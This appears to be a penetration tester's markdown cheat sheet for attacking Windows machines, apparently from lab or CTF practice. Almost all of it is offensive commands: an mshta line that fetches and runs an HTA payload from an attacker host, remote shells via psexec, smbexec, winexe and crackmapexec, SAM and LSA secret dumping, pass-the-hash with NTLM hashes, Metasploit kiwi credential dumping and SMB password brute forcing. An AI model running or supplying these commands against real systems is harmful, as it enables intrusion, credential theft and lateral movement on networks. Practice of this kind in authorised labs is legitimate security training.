# Windows
- Change windows user password          -   net user administrator hacker_123321
- Upgrade from shell to meterpreter using HTA
	- Kali		-		use exploit/windows/misc/hta_server
	- Client	-		mshta.exe http://10.10.0.2:8080/KPpYJ10IZfx.hta
# RDP
- Port 3389
- Connect                               -   xfreerdp /u:administrator /p:Password@123 /v:10.10.10.10
- Enable RDP from metasploit session    -   use post/windows/manage/enable_rdp

# SMB
- Get smb supported protocols			-	nmap -p445 --script smb-protocols 10.10.10.10

### 1. With Creds to shell
- psexec.py administrator:Password1@10.0.0.10
- smbexec.py administrator:carolina@10.0.0.169
- winexe -U administrator%alice_123321 //10.0.0.6 'whoami'
- smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.59 -x systeminfo
- Crackmapexec
	-	crackmapexec smb 10.0.0.94 -u Administrator -p 'sebastian' -x ipconfig
	-	crackmapexec smb 10.0.0.94 -u Administrator -p 'sebastian' --sam
	-	crackmapexec smb 10.0.0.94 -u Administrator -p 'sebastian' --lsa
	-	crackmapexec smb 10.0.0.94 -u Administrator -p 'sebastian' --shares

### 2. NTLM Hashes - PassTheHash
- Pth-Winexe `pth-winexe -U user%NTLM_HASH //10.10.10.10 cmd.exe`
- impacket `python smbclient.py -hashes 00000000000000000000000000000000:3CAC6D4B3A7E5014E32EB12EF0C75476 Domain/Administrator@IP`

### 3. WinRm
1. Configuration of WinRM
- GUI
	-	Run(Win+R) -> services.msc
	-	"Windows Remote Management (WS-Management)"
	-	Run(Windows+R) -> gpedit.msc
	-	Computer Configuration > Administrative Templates > Windows Components > Windows Remote Management (WinRM) > WinRM Service
	-	Enable -> Allow remote server management through WinRM, Put * in ipv4,ipv6 and Apply changes
	-	For firewall, RUN -> wf.msc 
	-	Inbound Rules > Windows Remote Management(HTTP-In) -> Enable rule
	-	Add a new user -> compmgmt.msc -> Add new user to Administrators,Remote Management Users
- Powershell
	-	Get-Service winrm
	-	winrm -?
	-	winrm get winrm/config
	-	winrm quickconfig
	-	winrm get winrm/config/service
	-	winrm e winrm/config/listener
	-	Attacker Machine
		-	Start-Service winrm
		-	Set-item wsman:localhost\client\trustedhosts -value *
		-		
2. Run commands
	-	Invoke-Command -ComputerName 10.0.0.10 -ScriptBlock {Get-Process} -Credential $cred

# Msf / Meterpreter 
1. Kiwi
-	 load kiwi
-	 Cached passwords etc.	-	creds_all
-	 All NTLM hashes	-	lsa_dump_sam
-	 Find syskey by dumping the LSA secrets	-	lsa_dump_secrets

2. Psexec login
- Bruteforce 
	- use auxiliary/scanner/smb/smb_login
	- set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
	- set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	- set RHOSTS 10.0.0.242
	- set VERBOSE false
	- exploit
- Login
	- use exploit/windows/smb/psexec
	- set RHOSTS 10.4.17.225
	- set SMBUser Administrator
	- set SMBPass qwertyuiop
	- exploit
# Powershell
1. Ps remoting shell
-	$cred = Get-Credential
-	administrator:hacker_123321
-	Enter-PSSession -ComputerName 10.0.0.178 -Authentication Negotiate -Credential $cred
